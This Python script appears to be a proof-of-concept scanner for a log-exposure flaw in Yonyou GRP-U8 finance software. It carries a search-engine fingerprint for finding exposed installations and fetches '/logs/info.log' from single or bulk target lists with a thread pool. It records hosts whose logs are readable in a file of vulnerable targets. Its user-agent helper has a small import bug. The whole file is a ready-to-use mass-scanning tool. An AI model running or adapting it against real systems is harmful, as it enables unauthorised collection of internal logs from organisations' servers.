#-*- coding: utf-8 -*-
from random import random

import requests
import sys
import threadpool
import urllib3
from argparse import ArgumentParser
from urllib import parse
from time import time
from multiprocessing.dummy import Pool

# body="U8Accid" || title="GRP-U8" || body="用友优普信息技术有限公司"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url_list = []


# 随机ua
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua


# 有漏洞的url写入文件
def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")


def check_url(url):
    url = parse.urlparse(url)
    url = url.scheme + '://' + url.netloc
    url = url + '/logs/info.log'
    # print(url)
    try:
        res = requests.get(url, verify=False, allow_redirects=True, timeout=100)
        if res.status_code == 200:
            lines = res.text.split('\n')[:100]
            truncated_response = '\n'.join(lines)
            if "INFO" in truncated_response:
                print("\033[32m[+]{} is vulnerable. \033[0m".format(url))
                wirte_targets(url, "vuln.txt")
        else:
            print("\033[31m[-]{} is no vulnerable. {}\033[0m".format(url, res.status_code))
    except Exception as e:
        print("[!]{} is timeout {}\033[0m".format(url, e))
        pass


def multithreading(url_list, pools=5):
    works = []
    for i in url_list:
        # works.append((func_params, None))
        works.append(i)
    # print(works)
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(check_url, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


if __name__ == '__main__':
    show = r'''


 _  _  _____  _  _  ___  _  _  _____  __  __       ___  ____  ____      __  __  ___ 
( \/ )(  _  )( \( )/ __)( \/ )(  _  )(  )(  )     / __)(  _ \(  _ \ ___(  )(  )( _ )
 \  /  )(_)(  )  (( (_-. \  /  )(_)(  )(__)(  ___( (_-. )   / )___/(___))(__)( / _ \
 (__) (_____)(_)\_)\___/ (__) (_____)(______)(___)\___/(_)\_)(__)      (______)\___/

                                                    tag:YongYou_GRP-U8 poc                                       
                                                     @version: 1.0.0   @author: csd  
	'''
    print(show + '\n')
    arg = ArgumentParser(description='check_url By csd')
    arg.add_argument("-u",
                     "--url",
                     help="Target URL; Example:python3 GRP-U8_loginfo.py -u http://www.example.com")
    arg.add_argument("-f",
                     "--file",
                     help="Target URL; Example:python3 GRP-U8_loginfo.py -f url.txt")
    args = arg.parse_args()
    url = args.url
    filename = args.file
    print("[+]任务开始.....")
    start = time()
    if url != None and filename == None:
        check_url(url)
    elif url == None and filename != None:
        for i in open(filename):
            i = i.replace('\n', '')
            url_list.append(i)
        multithreading(url_list, 10)
    end = time()
    print('任务完成,用时%ds.' % (end - start))